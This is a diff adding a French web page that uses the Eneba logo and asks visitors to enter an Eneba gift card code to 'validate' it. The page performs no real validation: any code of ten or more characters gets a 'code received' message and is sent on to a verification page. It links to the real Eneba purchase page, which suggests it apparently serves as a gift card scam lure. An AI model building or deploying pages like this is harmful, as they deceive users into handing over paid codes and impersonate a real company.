@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Valider une carte cadeau</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      margin: 0;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      text-align: center;
+      padding: 20px;
+    }
+
+    h2 {
+      color: #321f70;
+    }
+
+    input {
+      width: 100%;
+      height: 45px;
+      border-radius: 25px;
+      border: 1px solid #ccc;
+      text-align: center;
+      margin-top: 15px;
+    }
+
+    button {
+      width: 100%;
+      height: 45px;
+      margin-top: 20px;
+      border: none;
+      border-radius: 25px;
+      background: #4636f9;
+      color: #fff;
+      cursor: pointer;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+
+    .error {
+      color: red;
+      display: none;
+    }
+
+    .success {
+      color: green;
+      display: none;
+    }
+
+    /* Loader */
+    #loading-screen {
+      position: fixed;
+      inset: 0;
+      background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .loader {
+      width: 40px;
+      height: 40px;
+      border: 5px solid #eee;
+      border-top: 5px solid #4636f9;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Loading screen -->
+  <div id="loading-screen">
+    <div class="loader"></div>
+  </div>
+
+  <div class="container" style="display:none">
+
+    <div style="text-align:center">
+      <img src="img/eneba.png" width="140" alt="Eneba">
+    </div>
+
+    <h2>Valider une carte cadeau</h2>
+    <p>Entrez votre code cadeau Eneba</p>
+
+    <form id="enebaForm">
+      <input type="text" id="ykkCode" placeholder="UTILISER le code ENEBA 100 EUR" required>
+
+      <p id="error" class="error">Code invalide</p>
+      <p id="success" class="success">Code reçu, traitement en cours...</p>
+
+      <button type="submit">Valider</button>
+    </form>
+
+    <p>
+      <a href="https://www.eneba.com/fr/eneba-eneba-gift-card-100-eur-global" target="_blank">
+        Acheter un code cadeau
+      </a>
+    </p>
+
+    <p>
+      <a href="https://www.eneba.com/fr/eneba-eneba-gift-card-100-eur-global" target="_blank">
+        Acheter un code cadeau nouvelle stock
+      </a>
+    </p>
+
+  </div>
+
+  <script>
+    window.onload = () => {
+      setTimeout(() => {
+        document.getElementById("loading-screen").style.display = "none";
+        document.querySelector(".container").style.display = "block";
+      }, 1000);
+    };
+
+    document.getElementById("enebaForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const code = document.getElementById("ykkCode").value.trim();
+      const error = document.getElementById("error");
+      const success = document.getElementById("success");
+
+      error.style.display = "none";
+      success.style.display = "none";
+
+      if (code.length < 10) {
+        error.style.display = "block";
+        return;
+      }
+
+      success.style.display = "block";
+
+      // هنا تقدر دير redirect قانوني
+      // window.location.href = "verification.html";
+      if (code.length >= 10) {
+        window.location.href = "verification.html";
+      } else {
+        window.location.href = "error.html";
+      }
+    });
+  </script>
+</body>
+
+</html>
